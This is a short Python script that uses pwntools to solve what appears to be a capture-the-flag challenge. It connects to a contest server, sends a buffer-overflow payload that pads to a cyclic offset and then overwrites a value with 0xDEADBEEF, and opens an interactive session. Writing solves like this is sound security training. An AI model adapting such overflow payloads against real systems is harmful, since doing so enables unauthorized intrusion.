from pwn import *

p = remote('pwn.ctf.ae', 9810)

payload = b'A'*cyclic_find(0x61616174) + p32(0xDEADBEEF) # cyclic(500)
p.sendline(payload)

p.interactive()
